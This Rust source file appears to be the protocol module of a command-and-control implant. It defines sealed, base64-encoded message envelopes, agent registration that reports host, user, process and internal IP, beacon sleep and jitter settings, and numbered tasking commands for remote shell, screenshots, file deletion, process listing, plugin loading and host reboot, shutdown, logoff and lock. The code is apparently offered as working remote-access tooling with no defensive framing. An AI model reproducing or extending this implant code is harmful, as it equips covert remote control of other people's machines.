// Type1 wire envelopes (shared/protocol/envelope.go). Sealed payloads ride as
// base64 strings inside `d`; pre-registration payloads are plaintext JSON.
use base64::Engine;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::crypto::SessionKey;

pub const V: u32 = 2;
pub const MSG_REGISTER: &str = "register";
pub const MSG_CHECKIN: &str = "checkin";
pub const MSG_RESULT: &str = "result";
pub const MSG_PUBKEY: &str = "pubkey";

pub const CMD_SHELL: u32 = 1;
pub const CMD_SYSINFO: u32 = 9;
pub const CMD_SLEEP: u32 = 10;
pub const CMD_EXIT: u32 = 11;
pub const CMD_LS_JSON: u32 = 12;
pub const CMD_MKDIR: u32 = 13;
pub const CMD_RM: u32 = 14;
pub const CMD_REKEY: u32 = 22;
pub const CMD_RCP_CONNECT: u32 = 23;
pub const CMD_RCP_DISCONNECT: u32 = 24;
pub const CMD_SCREENSHOT: u32 = 25;
pub const CMD_PWD: u32 = 26;
pub const CMD_CLIENT_KILL: u32 = 27;
pub const CMD_HOST_REBOOT: u32 = 28;
pub const CMD_HOST_SHUTDOWN: u32 = 29;
pub const CMD_HOST_LOGOFF: u32 = 30;
pub const CMD_HOST_LOCK: u32 = 31;
pub const CMD_PS: u32 = 69;
pub const CMD_PLUGIN_LOAD: u32 = 60;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Envelope {
    pub v: u32,
    pub t: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub a: String,
    // z marks the sealed inner JSON as zstd-compressed (plan P6). The sender
    // sets it only when compression actually shrank the payload.
    #[serde(default, skip_serializing_if = "is_false")]
    pub z: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub d: Option<Value>,
}

fn is_false(b: &bool) -> bool { !*b }

impl Envelope {
    pub fn plain(t: &str, agent: &str, data: Value) -> Self {
        Self { v: V, t: t.into(), a: agent.into(), z: false, d: Some(data) }
    }

    pub fn sealed(t: &str, agent: &str, sk: &SessionKey, data: &Value) -> Self {
        Self::sealed_zstd(t, agent, sk, data, false)
    }

    // sealed_zstd seals data, zstd-compressing the inner JSON first when
    // `zstd` is on (plan P6). The flag is set only on genuinely compressed
    // payloads so receivers never try to decompress plaintext.
    pub fn sealed_zstd(t: &str, agent: &str, sk: &SessionKey, data: &Value, zstd: bool) -> Self {
        let b64 = base64::engine::general_purpose::STANDARD;
        let mut raw = serde_json::to_vec(data).expect("json");
        let mut z = false;
        if zstd {
            if let Some(packed) = crate::compress::compress(&raw) {
                raw = packed;
                z = true;
            }
        }
        let sealed = sk.seal(&raw);
        Self {
            v: V,
            t: t.into(),
            a: agent.into(),
            z,
            d: Some(Value::String(b64.encode(sealed))),
        }
    }

    pub fn marshal(&self) -> Vec<u8> {
        serde_json::to_vec(self).expect("json")
    }

    pub fn open_sealed(&self, sk: &SessionKey) -> Option<Value> {
        let b64 = base64::engine::general_purpose::STANDARD;
        let s = self.d.as_ref()?.as_str()?;
        let raw = sk.open(&b64.decode(s).ok()?)?;
        let raw = if self.z {
            crate::compress::decompress(&raw).ok()?
        } else {
            raw
        };
        serde_json::from_slice(&raw).ok()
    }
}

#[derive(Serialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub os: &'static str,
    pub arch: &'static str,
    pub user: String,
    pub pid: u32,
    pub process: String,
    #[serde(rename = "agent_ver")]
    pub agent_ver: &'static str,
    #[serde(rename = "internal_ip", skip_serializing_if = "String::is_empty")]
    pub internal_ip: String,
}

#[derive(Serialize)]
pub struct RegisterInfo {
    pub agent: String,
    pub system: SystemInfo,
    pub wk: String,
    pub psk: String,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub caps: Vec<String>,
    #[serde(default)]
    pub ts: i64,
    #[serde(default)]
    pub nonce: String,
    #[serde(default)]
    pub proto: u32,
}

#[derive(Deserialize, Default)]
pub struct RegisterAck {
    #[serde(default)]
    pub ok: bool,
    #[serde(default)]
    pub reason: String,
    #[serde(default)]
    pub server_now: i64,
    #[serde(default)]
    pub sleep_ms: i64,
    #[serde(default)]
    pub jitter_pct: i64,
    #[serde(default)]
    pub rcp_addr: String,
    #[serde(default)]
    pub rcp_token: String,
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
pub struct Task {
    #[serde(default)]
    pub id: String,
    #[serde(default)]
    pub cmd: u32,
    #[serde(default)]
    pub args: Value,
    #[serde(default)]
    pub created: i64,
}

#[derive(Serialize, Default)]
pub struct TaskResult {
    pub task_id: String,
    pub ok: bool,
    pub exit: i32,
    pub output: String,
}

pub fn heartbeat(seq: u64, uptime_ms: i64) -> Value {
    json!({ "seq": seq, "uptime_ms": uptime_ms })
}

pub fn b64() -> &'static base64::engine::general_purpose::GeneralPurpose {
    &base64::engine::general_purpose::STANDARD
}
